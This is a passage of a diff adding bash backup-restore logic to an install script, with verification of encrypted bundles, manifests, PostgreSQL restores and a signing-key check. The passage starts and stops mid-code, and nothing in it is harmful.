+        "$(wc -l < /tmp/added.p | tr -d " ")" \
+        "$(wc -l < /tmp/removed.p | tr -d " ")" \
+        "$(wc -l < /tmp/changed.p | tr -d " ")"
+    ' sh "$key" "$tree" 2> "$BK_RES_STAGE/diff.$key")" || {
+      bk_fail "restoring the volume \`$key\` into $vol failed. Checked, in order: the
+       decrypted tree is a directory, its listing is a file, the copy exited 0,
+       and the listing re-derived from what landed. Nothing here treats any of
+       those as an empty volume.
+$(sed 's/^/       /' "$BK_RES_STAGE/diff.$key" 2>/dev/null)"
+      return 1
+    }
+  entries="$(printf '%s' "$line" | awk '{print $1}')"
+  files="$(printf '%s' "$line" | awk '{print $2}')"
+  links="$(printf '%s' "$line" | awk '{print $3}')"
+  added="$(printf '%s' "$line" | awk '{print $4}')"
+  removed="$(printf '%s' "$line" | awk '{print $5}')"
+  changed="$(printf '%s' "$line" | awk '{print $6}')"
+  if [ -z "$entries" ] || [ -z "$added" ] || [ -z "$removed" ] || [ -z "$changed" ]; then
+    bk_fail "the restore of volume \`$key\` answered '$line', which is not six counts."
+    return 1
+  fi
+  if [ "$added" -ne 0 ] || [ "$removed" -ne 0 ] || [ "$changed" -ne 0 ]; then
+    bk_fail "the volume \`$key\` restored into $vol does not match the listing sealed in
+       this bundle: $added added, $removed removed, $changed changed. The first ten
+       differing paths:
+$(sed 's/^/         /' "$BK_RES_STAGE/diff.$key" 2>/dev/null)
+       The volume is left in place for inspection and this run stops before
+       touching the database."
+    return 1
+  fi
+  printf 'volume %s -> %s: %s entries, %s files, %s links, listing identical\n' \
+    "$key" "$vol" "$entries" "$files" "$links"
+}
+
+# ── §9.2 step 12: pg_restore, through a container on the server's network ───
+#
+# The dump never crosses the host: a throwaway container of the postgres image
+# mounts the content volume and talks to the server over the network it is on.
+# --exit-on-error is not tidiness — pg_restore's default is to continue past
+# errors, which turns a misdirected restore into an interleaving instead of a
+# stop — and --single-transaction is what makes a non-zero exit mean "the
+# database is exactly as it was".
+bk_pg_restore_into() {
+  local vol="$1" image="$2" net="$3" host="$4" db="$5" owner="$6" member="$7" err
+  err="$BK_RES_STAGE/pg_restore.$db.err"
+  if ! bk_docker run --rm --user 0:0 --network "$net" -v "$vol:/stage:ro" \
+    -e PGPASSFILE=/stage/.pgpass --entrypoint pg_restore "$image" \
+    --single-transaction --exit-on-error --no-owner --role="$owner" \
+    -h "$host" -U postgres -d "$db" "/stage/open/db/$member" > "$err" 2>&1; then
+    bk_fail "pg_restore of $member into $db exited non-zero. It ran
+       --single-transaction, so the whole transaction rolled back and $db is
+       exactly as it was. Verbatim:
+$(sed 's/^/       /' "$err" 2>/dev/null)"
+    return 1
+  fi
+  return 0
+}
+
+# ── §9.2 steps 13 and 14: the two measurements that decide the verdict ──────
+
+# Re-measure every table of $3 on server $2 under the manifest's own session
+# and compare to the counts TSV at $4. EVERY difference is listed, not the
+# first (§9.2 step 13). A count difference is a failure: unlike v3, which
+# forgave it because it compared n_live_tup statistics
+# (backend/app/backup_restore.py:264-279), both sides here are exact count(*).
+bk_compare_census() {
+  local pgid="$1" db="$2" want="$3" got diffs n
+  got="$BK_RES_STAGE/$db.restored.tsv"
+  bk_census "$pgid" "$db" > "$got" || return 1
+  diffs="$(awk -F'\t' '
+    NR == FNR { w[$1] = $2 "\t" $3; seen[$1] = 1; next }
+    { g[$1] = $2 "\t" $3; there[$1] = 1 }
+    END {
+      for (t in seen) {
+        if (!(t in there)) { printf "%s: in the bundle and not in the restore\n", t; continue }
+        if (w[t] != g[t]) {
+          split(w[t], a, "\t"); split(g[t], b, "\t")
+          printf "%s: bundle %s rows / digest %s, restored %s rows / digest %s\n", t, a[1], a[2], b[1], b[2]
+        }
+      }
+      for (t in there) if (!(t in seen)) printf "%s: in the restore and named by no row of the bundle\n", t
+    }
+  ' "$want" "$got" | LC_ALL=C sort)"
+  if [ -n "$diffs" ]; then
+    bk_fail "$db does not measure equal to the bundle. Both sides were measured under
+       the same six pinned GUCs, so this is the data, not the frame. Every
+       difference:
+$(printf '%s\n' "$diffs" | sed 's/^/         /')"
+    return 1
+  fi
+  n="$(wc -l < "$want" | tr -d ' ')"
+  printf '%s\n' "$n"
+}
+
+# encode(sha256(private_key_hex::bytea), 'hex') out of the restored core
+# database, against what the manifest recorded. Every paired device pins this
+# key (services/core/app/devices_ws.py:288-289), so a restore that lost it
+# silently un-pairs every device — which is why this is LOUD and not a
+# warning. `null == null` is equality; one side null is a failure.
+bk_compare_signing_key() {
+  local pgid="$1" db="$2" want="$3" rows got
+  rows="$(bk_psql "$pgid" "$db" "SELECT count(*) FROM core_signing_key" 2>/dev/null | tr -dc '0-9')"
+  if [ -z "$rows" ]; then
+    bk_fail "could not count core_signing_key in the restored $db, so nothing can say
+       whether this hub's identity survived. Every paired device pins that key."
+    return 1
+  fi
+  got=""
+  if [ "$rows" -eq 1 ]; then
+    got="$(bk_psql "$pgid" "$db" "SELECT encode(sha256(private_key_hex::bytea), 'hex') FROM core_signing_key" 2>/dev/null)"
+    if [ -z "$got" ]; then
+      bk_fail "could not compute the core signing key's digest in the restored $db."
+      return 1
+    fi
+  elif [ "$rows" -gt 1 ]; then
+    bk_fail "the restored $db carries $rows core_signing_key rows. There is exactly one
+       answer to \"which key is core's\"."
+    return 1
+  fi
+  if [ "$got" != "$want" ]; then
+    bk_fail "THE SIGNING KEY DID NOT SURVIVE. The bundle recorded
+       ${want:-<no key: this hub had never paired a device>} and the restored $db
+       measures ${got:-<no key>}. Every paired device pins this key
+       (services/core/app/devices_ws.py:288-289): a hub whose key changed has
+       un-paired every device it had."
+    return 1
+  fi
+  if [ -z "$want" ]; then
+    printf 'signing key: the bundle carried none and the restore has none — equal\n'
+  else
+    printf 'signing key: fingerprint equal (%s)\n' "$want"
+  fi
+  return 0
+}
+
+# ── the outer file, checked on the HOST before a container is started ───────
+#
+# §5.1 forces the outer member order, and the first six members are cleartext,
+# so all of this is `tar` on the host: no image, no passphrase, no decrypt.
+# Doing it here rather than through `novabundle.py verify --bundle` is
+# deliberate — novabundle imports `cryptography` to decrypt, and the image a
+# bare restore target actually has is `python:3.12-slim`, which does not carry
+# it (that is the whole reason nova_restore.py has a ctypes backend). A check
+# that only runs on a machine that has already installed Nova is not a check
+# the restore path has.
+BK_OUTER_ORDER="README.txt nova_restore.py restore.sh kat.sha256 kat.enc meta.json payload.enc"
+
+# Every top-level key §5.3 documents, in its order. A manifest carrying a key
+# this reader does not know is not a manifest it may restore from — §5.3's
+# own rule, enforced here because the strict loader lives in a module the
+# fallback image cannot import. `the_reader_knows_every_key_the_writer_writes`
+# pins this set equal to novabundle.MANIFEST_SPEC's, so the two cannot drift.
+BK_MANIFEST_KEYS="format bundle_version created_at mode transport migration_match source postgres session databases volumes binds files env_keys members member_count excluded coverage identity encryption reader_sha256"
+
+bk_outer_members() {
+  tar -tf "$1" 2>/dev/null | sed 's|/$||' | sed '/^$/d'
+}
+
+bk_outer_member() {
+  tar -xOf "$1" "$2" 2>/dev/null
+}
+
+# ── the passphrase, which a restore never creates ───────────────────────────
+#
+# `--passphrase-file` is read here and not through passphrase.sh's `file`
+# resolver, because that resolver takes its PATH from deploy/.env
+# (np_passphrase_file) and this one comes from the operator's own command
+# line. The four checks are the same four, deliberately: a store that exists
+# and cannot be read at the mode it should have is not an absent one.
+bk_read_passphrase_file() {
+  local path="$1" mode value
+  if [ ! -f "$path" ]; then
+    bk_fail "--passphrase-file $path is not a regular file."
+    return 1
+  fi
+  mode="$(bk_mode_of "$path")"
+  if [ -z "$mode" ]; then
+    bk_fail "neither \`stat -c\` nor \`stat -f\` could read the mode of $path — refusing
+       rather than assuming it is 0600."
+    return 1
+  fi
+  if [ "$mode" != "600" ]; then
+    bk_fail "$path is mode $mode, not 600. The passphrase opens every bundle this
+       machine has ever written; it is not read from a file other users can read."
+    return 1
+  fi
+  value="$(cat "$path" 2>/dev/null)"
+  if [ -z "$value" ]; then
+    bk_fail "$path is empty. An empty passphrase is not a passphrase."
+    return 1
+  fi
+  if [ "$(printf '%s' "$value" | wc -l | tr -d ' ')" -gt 0 ]; then
+    bk_fail "$path holds more than one line. The passphrase is one line; a file like
+       this would be silently cut at the first newline."
+    return 1
+  fi
+  printf '%s' "$value"
+}
+
+# ── the verb (design-verdict.md §9.2 and §9.3) ──────────────────────────────
+#
+# `set -e` is turned OFF for the length of the verb and restored on the way
+# out, for exactly cmd_backup's reason (T3's reading 8): deploy/install.sh:8
+# is `set -euo pipefail` and it sources this file, and under a live `-e` the
+# shell exits at the first `x="$(cmd)"` whose command failed — BEFORE the
+# check that would have said why. Every refusal below is a sentence; `-e`
+# would replace each of them with a bare status. `-u` and `pipefail` stay on.
+cmd_restore() {
+  local had_e=0 code=0
+  case "$-" in
+    *e*) had_e=1; set +e ;;
+  esac
+  bk_restore_run "$@"
+  code=$?
+  if [ "$had_e" -eq 1 ]; then
+    set -e
+  fi
+  return "$code"
+}
+
+cmd_drill() {
+  local had_e=0 code=0
+  case "$-" in
+    *e*) had_e=1; set +e ;;
+  esac
+  bk_drill_run "$@"
+  code=$?
+  if [ "$had_e" -eq 1 ]; then
+    set -e
+  fi
+  return "$code"
+}
+
+bk_restore_run() {
+  local bundle="" pwfile="" drill=0 D=""
+  local stage facts project pw pw_source rc line key full disp
+  local crypto_img pg_tag manifest marker body
+  local names want got n
+  local db owner dump_m counts_m migr_m tbl
+  local tables_total dbs_total vols_total
+  local net pghost pgid scratch subnet inuse routes
+  local created_at src_host src_sha src_project mode_in
+  local need_major have_ver have_major srv_want srv_num_want
+  local carried plan_write plan_same plan_replace k v cur
+  local vol_full vol_key vol_tree sign_want sign_db
+  local unhealthy migr_file svc dir found sha f
+  local bundle_sha bundle_dir bundle_base
+
+  while [ $# -gt 0 ]; do
+    case "$1" in
+      --drill) drill=1 ;;
+      --passphrase-file) shift; pwfile="${1:-}" ;;
+      --passphrase-file=*) pwfile="${1#--passphrase-file=}" ;;
+      -h | --help)
+        printf './install restore <bundle> [--drill] [--passphrase-file FILE]\n'
+        return 0
+        ;;
+      -*)
+        bk_fail "restore: unknown option '$1'. Usage:
+       ./install restore <bundle> [--drill] [--passphrase-file FILE]"
+        return 2
+        ;;
+      *)
+        if [ -n "$bundle" ]; then
+          bk_fail "restore: one bundle at a time; got '$bundle' and '$1'."
+          return 2
+        fi
+        bundle="$1"
+        ;;
+    esac
+    shift
+  done
+  if [ -z "$bundle" ]; then
+    bk_fail "restore: name the bundle. Usage:
+       ./install restore <bundle> [--drill] [--passphrase-file FILE]"
+    return 2
+  fi
+  if [ ! -f "$bundle" ]; then
+    bk_fail "restore: no such bundle: $bundle"
+    return 2
+  fi
+  bundle_dir="$(cd "$(dirname "$bundle")" && pwd)" || return 1
+  bundle_base="$(basename "$bundle")"
+  bundle="$bundle_dir/$bundle_base"
+
+  BK_RES_CLEANED=0
+  BK_RES_STAGE=""
+  BK_RES_VOL=""
+  BK_RES_DRILL_VOLS=""
+  BK_RES_DRILL_NET=""
+  BK_RES_DRILL_CT=""
+  BK_RES_DRILL_DBS=""
+  BK_RES_DRILL_PGID=""
+  trap 'bk_restore_cleanup; exit 1' INT TERM
+  trap 'bk_restore_cleanup' EXIT
+
+  # ── 1. a moved host, and a restore that did not finish ───────────────────
+  if [ -e "$(bk_moved_marker)" ] && [ "$drill" -eq 0 ]; then
+    bk_fail "this host was parked by a \`backup --move\`:
+
+$(sed 's/^/       /' "$(bk_moved_marker)" 2>/dev/null)
+
+       Nova is meant to be running somewhere else. If it is not, run
+       \`./install undo-move\` here first."
+    return 1
+  fi
+
+  stage="$(mktemp -d "${TMPDIR:-/tmp}/nova-restore-stage.XXXXXX")" || return 1
+  chmod 700 "$stage"
+  BK_RES_STAGE="$stage"
+  facts="$stage/facts"
+  mkdir -p "$facts"
+
+  if [ "$drill" -eq 1 ]; then
+    D="$(bk_hex8)" || return 1
+    printf 'drill %s: nothing below touches a live volume, a live database, a live\n' "$D"
+    printf '         container or deploy/.env.\n'
+  else
+    # ── 2. deploy/.env, from the example, BEFORE anything writes a key ─────
+    #
+    # port-v3 M2 / python-tool M3: set_env_value reads $ENV_FILE to rewrite
+    # it, and on a bare restore target that file does not exist. cmd_install
+    # never hits it because generate_secrets copies the example first; restore
+    # has no equivalent, so this is it.
+    if [ ! -f "$(bk_env_file)" ]; then
+      if [ ! -f "$(bk_env_example)" ]; then
+        bk_fail "neither $(bk_env_file) nor $(bk_env_example) is here, so this restore has
+       nothing to write the carried keys into."
+        return 1
+      fi
+      (
+        umask 077
+        cp "$(bk_env_example)" "$(bk_env_file)"
+      ) || {
+        bk_fail "could not create $(bk_env_file) from $(bk_env_example)."
+        return 1
+      }
+      chmod 600 "$(bk_env_file)" 2>/dev/null
+      line="$(bk_mode_of "$(bk_env_file)")"
+      if [ "$line" != "600" ]; then
+        bk_fail "$(bk_env_file) was created from the example and reads back mode
+       ${line:-unreadable}, not 600. It is about to hold every secret this hub has."
+        return 1
+      fi
+      printf 'env: %s created from the example, mode read back 600\n' "$(bk_env_file)"
+    else
+      printf 'env: %s is already here\n' "$(bk_env_file)"
+    fi
+
+    # ── 3. decide_subnet FIRST ────────────────────────────────────────────
+    #
+    # Before anything creates a docker object, because a restore that creates
+    # six volumes and THEN discovers the subnet is taken has already done work
+    # it cannot undo. It writes the five keys and reads every one back.
+    if ! command -v decide_subnet >/dev/null 2>&1; then
+      bk_fail "decide_subnet is not defined. deploy/subnet.sh is sourced by
+       deploy/install.sh; restore cannot pick this machine's addressing without it."
+      return 1
+    fi
+    decide_subnet || return 1
+  fi
+
+  # The render: this checkout's own compose, every profile. It is the source
+  # of the declared volume set, of each volume's FULL NAME on THIS machine,
+  # of the project label and of the postgres image tag — none of which is ever
+  # taken out of the bundle.
+  bk_set_compose_args
+  render_dispositions "$stage" || return 1
+  bk_set_project "$stage" || return 1
+  project="$(bk_project)" || return 1
+  pg_tag="$(bk_render_pg_tag "$facts")" || return 1
+  bk_ensure_image "$pg_tag" || return 1
+  crypto_img="$(bk_crypto_image)" || return 1
+  printf 'images: postgres %s, decryptor %s (both resolved on this host, never from\n' \
+    "$pg_tag" "$crypto_img"
+  printf '        the bundle)\n'
+
+  # ── 4. open the bundle: the outer shape, then the KAT ────────────────────
+  names="$(bk_outer_members "$bundle" | tr '\n' ' ')"
+  want="$(printf '%s ' $BK_OUTER_ORDER)"
+  if [ "$names" != "$want" ]; then
+    bk_fail "$bundle_base is not a Nova bundle: its members are [${names% }] and §5.1
+       forces [${want% }], in that order."
+    return 1
+  fi
+  line="$(bk_outer_member "$bundle" meta.json)"
+  if [ -z "$line" ]; then
+    bk_fail "$bundle_base carries no readable meta.json."
+    return 1
+  fi
+  printf '%s\n' "$line" > "$stage/meta.json"
+  n="$(bk_json_field outer_version < "$stage/meta.json")" || n=""
+  if [ "$n" != "1" ]; then
+    bk_fail "$bundle_base records outer_version '${n:-none}', and this tool knows 1."
+    return 1
+  fi
+  n="$(bk_json_field bundle_version < "$stage/meta.json")" || n=""
+  if [ "$n" = "1" ]; then
+    bk_fail "$bundle_base is a bundle_version 1 bundle — that is v3's shape, and this
+       tool reads version 2. It is refused by name rather than half-read."
+    return 1
+  fi
+
+  if [ -n "$pwfile" ]; then
+    pw="$(bk_read_passphrase_file "$pwfile")" || return 1
+    pw_source="--passphrase-file $pwfile"
+  else
+    pw_source="$(nova_passphrase_source)"
+    rc=0
+    pw="$(resolve_passphrase)" || rc=$?
+    if [ "$rc" -eq 3 ]; then
+      bk_fail "there is no passphrase here, and a restore never generates one: the
+       bundle is already sealed with the one that wrote it. The resolver
+       '$pw_source' reported ABSENT.
+       meta.json records passphrase fingerprint $(bk_json_field passphrase_fingerprint < "$stage/meta.json" 2>/dev/null) (cleartext,
+       unauthenticated — advisory only)."
+      return 1
+    fi
+    if [ "$rc" -ne 0 ] || [ -z "$pw" ]; then
+      bk_fail "no passphrase, no restore. The resolver '$pw_source' exited $rc."
+      return 1
+    fi
+  fi
+
+  # The known-answer test, against 64 known bytes under their own fresh salt,
+  # BEFORE a payload byte is read. On a many-GB bundle read off a removable
+  # drive a wrong passphrase must cost one scrypt and nothing else — and the
+  # refusal names the fingerprint meta.json recorded, so a rotation is STATED
+  # when it is known and never guessed. The same run hands back the sealed
+  # MANIFEST.json; see bk_read_manifest for why that is not free.
+  manifest="$stage/MANIFEST.json"
+  rc=0
+  printf '%s\n' "$pw" | bk_read_manifest "$bundle_dir" "$bundle_base" "$crypto_img" \
+    > "$manifest" 2> "$stage/kat.out" || rc=$?
+  if [ "$rc" -eq 1 ]; then
+    bk_fail "the passphrase does not open $bundle_base. Nothing was read past the
+       known-answer test.
+$(sed 's/^/       /' "$stage/kat.out" 2>/dev/null)"
+    return 1
+  fi
+  if [ "$rc" -ne 0 ]; then
+    bk_fail "$bundle_base opened and what came out of it is not a bundle this tool can
+       read:
+$(sed 's/^/       /' "$stage/kat.out" 2>/dev/null)"
+    return 1
+  fi
+  if [ ! -s "$manifest" ]; then
+    bk_fail "$bundle_base was opened and produced no MANIFEST.json."
+    return 1
+  fi
+  chmod 600 "$manifest" 2>/dev/null
+  printf 'passphrase: %s — the known-answer test passed before a payload byte was read\n' \
+    "$pw_source"
+
+  # ── 5a. what the manifest says about itself ──────────────────────────────
+  #
+  # Every one of these runs BEFORE anything is created and before the payload
+  # is extracted, so a bundle that disagrees with itself costs one decrypt
+  # and no docker object at all.
+  # §5.3: a documented key that is absent, or a key this reader does not know,
+  # is an error — a manifest this code does not fully understand is not a
+  # manifest it may restore from.
+  # [A-Za-z_0-9], because `reader_sha256` carries digits and a class without
+  # them reported the last documented key as absent on every real bundle.
+  got="$(sed -n 's/^  "\([A-Za-z_0-9]*\)": .*$/\1/p' "$manifest" | tr '\n' ' ')"
+  for k in $BK_MANIFEST_KEYS; do
+    case " $got " in
+      *" $k "*) ;;
+      *)
+        bk_fail "the manifest inside $bundle_base has no \`$k\`, which §5.3 documents. A
+       manifest this reader does not fully understand is not one it restores from."
+        return 1
+        ;;
+    esac
+  done
+  for k in $got; do
+    case " $BK_MANIFEST_KEYS " in
+      *" $k "*) ;;
+      *)
+        bk_fail "the manifest inside $bundle_base carries \`$k\`, which this reader does
+       not know. A manifest written by a newer Nova is refused, not half-read."
+        return 1
+        ;;
+    esac
+  done
+
+  # Every field meta.json duplicates, re-read from the AUTHENTICATED manifest
+  # and compared. meta.json is cleartext and unauthenticated; a disagreement
+  # is a refusal (§5.4).
+  for line in "format:format" "bundle_version:bundle_version" \
+    "created_at:created_at" "mode:mode" "transport:transport" \
+    "member_count:member_count" "reader_sha256:reader_sha256"; do
+    k="${line%%:*}"
+    v="${line#*:}"
+    want="$(bk_json_field "$k" < "$stage/meta.json" 2>/dev/null)" || want=""
+    got="$(bk_m_top "$v" < "$manifest")" || got=""
+    if [ "$want" != "$got" ]; then
+      bk_fail "$bundle_base disagrees with itself: its cleartext meta.json says
+       $k='$want' and the manifest sealed inside says $v='$got'."
+      return 1
+    fi
+  done
+  want="$(bk_json_field source_host < "$stage/meta.json" 2>/dev/null)" || want=""
+  got="$(bk_m_sub source host < "$manifest")" || got=""
+  if [ "$want" != "$got" ]; then
+    bk_fail "$bundle_base disagrees with itself: meta.json says source_host='$want' and
+       the sealed manifest says source.host='$got'."
+    return 1
+  fi
+  # The reader that ships in the bundle is the one manifest.reader_sha256
+  # names — checked here, on the host, with no decrypt at all.
+  want="$(bk_m_top reader_sha256 < "$manifest")" || want=""
+  got="$(bk_outer_member "$bundle" nova_restore.py | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1)"
+  if [ -z "$got" ] || [ "$want" != "$got" ]; then
+    bk_fail "the nova_restore.py inside $bundle_base hashes to '${got:-nothing}' and the
+       sealed manifest names '$want'."
+    return 1
+  fi
+
+  created_at="$(bk_m_top created_at < "$manifest")" || created_at=""
+  mode_in="$(bk_m_top mode < "$manifest")" || mode_in=""
+  src_host="$(bk_m_sub source host < "$manifest")" || src_host=""
+  src_sha="$(bk_m_sub source repo_sha < "$manifest")" || src_sha=""
+  src_project="$(bk_m_sub source project < "$manifest")" || src_project=""
+  printf 'bundle: %s, a %s backup written %s on %s (project %s, commit %s)\n' \
+    "$bundle_base" "$mode_in" "$created_at" "$src_host" "$src_project" \
+    "${src_sha:-unrecorded}"
+
+  # §5.3: restore re-measures under the manifest's OWN session, so a key it
+  # does not know is a refusal. A digest measured under a frame this tool
+  # cannot reproduce is not comparable to one it re-measures.
+  got="$(bk_m_sub_keys session < "$manifest" | LC_ALL=C sort | tr '\n' ' ')"
+  want="$(printf '%s' "$BK_SESSION_SQL" | tr ';' '\n' |
+    sed -n 's/^ *SET LOCAL \([A-Za-z_]*\)=.*/\1/p' | LC_ALL=C sort | tr '\n' ' ')"
+  if [ "$got" != "$want" ]; then
+    bk_fail "this bundle's digests were measured under the session [${got% }] and this
+       tool measures under [${want% }]. A digest measured under a frame this
+       restore cannot reproduce is not one it can compare."
+    return 1
+  fi
+  printf 'session: the six pinned GUCs in this bundle are the six this tool measures under\n'
+
+  # ── 6. refuse a non-empty target ─────────────────────────────────────────
+  #
+  # THE SINGLE MOST IMPORTANT LINE IN THE VERB, and the reason this design
+  # needs no pre-restore snapshot and no database swap: a bad restore cannot
+  # be rolled back in place, so a restore only ever runs where there is
+  # nothing to roll back to.
+  #
+  # Over the DECLARED set and not over manifest.volumes (port-v3 M1,
+  # shell-first M3): v4_pgdata is `dump-pg`, so it has no manifest.volumes row
+  # at all, and a loop over the manifest never inspects the single most
+  # important non-empty target on the machine. The sequence that hides behind
+  # that omission: the target ran ./install once and was `compose down`-ed, so
+  # its PGDATA holds the TARGET's password; restore writes the carried .env
+  # with the SOURCE's; postgres-init does not re-run on a non-empty PGDATA;
+  # pg_restore succeeds over the local socket as superuser; every census
+  # matches; and then core, gateway and memory all fail to authenticate over
+  # TCP. The restore verified counts and digests and still produced a hub that
+  # cannot open its own database.
+  #
+  # The declared set is read from THIS checkout's render — never from the
+  # bundle, and never assembled as <project>_<key>. A volume the render prunes
+  # is one `docker compose up` will not create or adopt here either, so it is
+  # not a target this restore can write into.
+  if [ "$drill" -eq 0 ]; then
+    got=""
+    for key in $(cfg_volume_keys < "$facts/config.yaml"); do
+      full="$(cfg_volume_name "$key" < "$facts/config.yaml")"
+      disp="$(cfg_volume_disposition "$key" < "$facts/config.yaml" | cut -f1)"
+      if [ -z "$full" ]; then
+        bk_fail "this checkout's render declares the volume \`$key\` and gives it no
+       \`name:\`, so nothing here knows what docker would call it."
+        return 1
+      fi
+      if [ -z "$disp" ]; then
+        bk_fail "this checkout's render declares the volume \`$key\` with no
+       x-nova-backup disposition, so nothing here can say whether a restore
+       writes into it."
+        return 1
+      fi
+      case "$disp" in
+        include | move-only | dump-pg) ;;
+        *) continue ;;
+      esac
+      rc=0
+      bk_volume_state "$full" "$pg_tag" || rc=$?
+      case "$rc" in
+        0) ;;
+        1) got="$got
+       volume $full ($key, $disp) exists and is not empty" ;;
+        *) got="$got
+       volume $full ($key, $disp) exists and could not be read — \"could not
+       determine\" is a refusal here, not a pass" ;;
+      esac
+    done
+    line="$(bk_docker ps -a --filter "label=com.docker.compose.project=$project" \
+      --format '{{.Names}}' 2>/dev/null | sed '/^$/d' | tr '\n' ' ')"
+    if [ -n "$line" ]; then
+      got="$got
+       container(s) of the project \`$project\` are here, exited ones included:
+       ${line% }"
+    fi
+    if [ -n "$got" ]; then
+      bk_fail "this is not an empty target, and a restore never writes over a live
+       one:$got
+
+       A bad restore CANNOT be rolled back in place, which is why this refuses
+       instead of merging. Tear the old stack down first:
+         docker compose --project-directory $BK_DIR down -v$(
+        if [ -f "$(bk_restore_marker)" ]; then
+          printf '\n\n       A previous restore did not finish. It recorded exactly what it created:\n'
+          sed 's/^/         /' "$(bk_restore_marker)"
+          printf '\n       Nothing here discovers anything: that list is the bound. To clear it,\n'
+          printf '       remove those objects and then delete %s.' "$(bk_restore_marker)"
+        fi
+      )"
+      return 1
+    fi
+    printf 'target: every declared volume this restore fills is absent or empty, and no\n'
+    printf '        container of the project `%s` is here\n' "$project"
+  fi
+
+  # ── 5b. decrypt, extract, re-derive every member's sha256 ────────────────
+  #
+  # Into a throwaway docker volume the HOST NEVER MOUNTS, for cmd_backup's
+  # reason: the dumps hold the signing key and every provider API key.
+  # nova_restore.py --out does the whole of §9.2 step 5 — safe_extract refuses
+  # an absolute member, a `..` member, a hardlink, a device node and an
+  # ESCAPING symlink (s41/rulings.md A), then re-derives every member's
+  # sha256 from the extracted bytes and compares.
+  #
+  # AFTER step 6, which the verdict puts after this. The order between them
+  # is not load-bearing and the cost is: a target that is going to be refused
+  # is refused before a multi-gigabyte payload is decrypted and written, not
+  # after. Every check either side still runs, in the same relation to what
+  # it guards.
+  if [ "$drill" -eq 1 ]; then
+    BK_RES_VOL="nova-drill-${D}_content"
+    bk_drill_volume_create "$BK_RES_VOL" || return 1
+  else
+    BK_RES_VOL="nova-restore-content-$(bk_stamp)-$$"
+    if ! bk_docker volume create "$BK_RES_VOL" >/dev/null 2>&1; then
+      bk_fail "could not create the decrypted-content volume $BK_RES_VOL."
+      return 1
+    fi
+  fi
+  if ! printf '%s\n' "$pw" | bk_nova -v "$bundle_dir:/bundle:ro" -v "$BK_RES_VOL:/stage" \
+    "$crypto_img" python3 /novabundle/nova_restore.py "/bundle/$bundle_base" \
+    --out /stage/open > "$stage/open.out" 2>&1; then
+    # No next steps at all: a failed verify must never read as a partial
+    # success (§9.2 step 5).
+    bk_fail "$bundle_base does not verify, so nothing was restored from it:
+$(sed 's/^/       /' "$stage/open.out" 2>/dev/null)"
+    return 1
+  fi
+  printf 'bundle: every member re-hashed from the decrypted bytes and matched\n'
+
+  # ── 7. the version gate, and the migration gate ──────────────────────────
+  #
+  # `postgres:16` pins the MAJOR only (measurements.md R1), so the exact
+  # server version travels in the manifest and the comparison belongs HERE.
+  # The same $PG_IMAGE answers the gate and runs the server, so this cannot
+  # check a version it will not use (port-v3 m9).
+  need_major="$(bk_m_sub postgres pg_dump_major < "$manifest")" || need_major=""
+  srv_want="$(bk_m_sub postgres server_version < "$manifest")" || srv_want=""
+  srv_num_want="$(bk_m_sub postgres server_version_num < "$manifest")" || srv_num_want=""
+  if [ -z "$need_major" ]; then
+    bk_fail "the manifest records no postgres.pg_dump_major, so nothing here can say
+       whether this host's pg_restore can read its dumps."
+    return 1
+  fi
+  have_ver="$(bk_pg_run --network none --entrypoint pg_restore "$pg_tag" --version 2>/dev/null | awk '{print $NF}')"
+  have_major="${have_ver%%.*}"
+  case "$have_major" in
+    "" | *[!0-9]*)
+      bk_fail "\`pg_restore --version\` in $pg_tag answered '${have_ver:-nothing}', so this
+       host's major version is unreadable. A dump restored by a pg_restore nobody
+       could identify is a restore nobody can promise."
+      return 1
+      ;;
+  esac
+  if [ "$have_major" -lt "$need_major" ]; then
+    bk_fail "this bundle was written by pg_dump major $need_major and this host's
+       $pg_tag carries pg_restore $have_ver (major $have_major). A lower major cannot
+       read a higher major's custom-format dump."
+    return 1
+  fi
+  printf 'postgres: the bundle was written by server %s (%s) / pg_dump major %s; this\n' \
+    "$srv_want" "$srv_num_want" "$need_major"
+  printf '          host has %s with pg_restore %s (major %s)\n' "$pg_tag" "$have_ver" "$have_major"
+
+  # Every applied migration must exist in THIS checkout — matched by CONTENT,
+  # which is what makes a renumbered migration match and a genuinely different
+  # one refuse (shell-first M12). There is no override flag: an override that
+  # proceeds is a fallback that reads as success.
+  dbs_total=0
+  while IFS=$'\037' read -r db owner dump_m counts_m migr_m tbl; do
+    [ -n "$db" ] || continue
+    dbs_total=$((dbs_total + 1))
+    if ! bk_is_sql_name "$db" || ! bk_is_sql_name "$owner"; then
+      bk_fail "the manifest names a database '$db' owned by '$owner'. A name this shell
+       is about to put in SQL and in argv is [A-Za-z_][A-Za-z0-9_]* and nothing
+       else."
+      return 1
+    fi
+    # Every member this verb reads is built from the database NAME it has just
+    # shape-checked, and the manifest's own field has to agree with it. A path
+    # out of the bundle is never joined onto anything here: that is the class
+    # that has bitten this file three times (s41/rulings.md).
+    if [ "$dump_m" != "db/$db.dump" ] ||
+      [ "$counts_m" != "db/$db.counts.tsv" ] ||
+      [ "$migr_m" != "db/$db.migrations.tsv" ]; then
+      bk_fail "the manifest gives $db the members '$dump_m', '$counts_m' and '$migr_m',
+       and a Nova bundle names them db/$db.dump, db/$db.counts.tsv and
+       db/$db.migrations.tsv. Nothing here reads a path the bundle chose."
+      return 1
+    fi
+    svc="${db#nova_}"
+    dir="$BK_REPO_ROOT/services/$svc/migrations"
+    migr_file="$stage/$db.migrations.tsv"
+    bk_stage_get "$BK_RES_VOL" "$crypto_img" "open/db/$db.migrations.tsv" > "$migr_file" || {
+      bk_fail "could not read db/$db.migrations.tsv out of the opened bundle."
+      return 1
+    }
+    if [ ! -s "$migr_file" ]; then
+      bk_fail "db/$db.migrations.tsv is empty in this bundle, so nothing can say which
+       migrations produced the rows it carries."
+      return 1
+    fi
+    if [ ! -d "$dir" ]; then
+      bk_fail "$db records applied migrations and $dir is not in this checkout. This
+       bundle is from a Nova this checkout does not have; check out
+       $(printf '%s' "${src_sha:-the recorded commit}" | cut -c1-7) and restore there."
+      return 1
+    fi
+    while IFS=$'\t' read -r f sha; do
+      [ -n "$f" ] || continue
+      found=""
+      for v in "$dir"/*; do
+        [ -f "$v" ] || continue
+        n="$(sha256_of "$v")" || return 1
+        if [ "$n" = "$sha" ]; then
+          found="$(basename "$v")"
+          break
+        fi
+      done
+      if [ -z "$found" ]; then
+        bk_fail "$db was migrated by '$f' and no file in services/$svc/migrations has
+       that content. This bundle is from a Nova this checkout does not have; check
+       out $(printf '%s' "${src_sha:-the recorded commit}" | cut -c1-7) and restore
